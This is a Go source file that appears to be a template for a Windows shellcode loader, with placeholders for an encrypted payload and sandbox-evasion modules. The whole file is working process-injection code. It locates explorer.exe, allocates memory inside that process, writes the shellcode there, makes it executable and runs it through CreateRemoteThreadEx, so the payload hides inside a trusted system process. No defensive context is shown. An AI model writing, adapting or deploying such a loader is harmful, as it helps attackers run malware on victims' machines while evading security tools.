package main

import (
	"encoding/hex"
	ps "github.com/mitchellh/go-ps"
	"golang.org/x/sys/windows"
	"unsafe"
	//__ENCRYPTMODULE__
	//__SANDBOXMODULE__
)

var shellcode []byte

const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)

func main() {

	processList, err := ps.Processes()
	if err != nil {
		return
	}
	var pid int
	for _, process := range processList {
		if process.Executable() == "explorer.exe" {
			pid = process.Pid()
			break
		}
	}
	//__SANDBOX__
	shellcode, _ := hex.DecodeString("__SHELLCODE__")
	//__ENCRYPTCODE__
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	CreateRemoteThreadEx := kernel32.NewProc("CreateRemoteThreadEx")
	CloseHandle := kernel32.NewProc("CloseHandle")

	pHandle, _, _ := OpenProcess.Call(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|
			windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(pid)))

	addr, _, _ := VirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)),
		MemCommit|MemReserve|PageReadwrite)

	_, _, _ = WriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtectEx.Call(pHandle, addr, uintptr(len(shellcode)),
		PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	_, _, _ = CreateRemoteThreadEx.Call(pHandle, 0, 0, addr, 0, 0, 0)
	_, _, _ = CloseHandle.Call(uintptr(uint32(pHandle)))

}
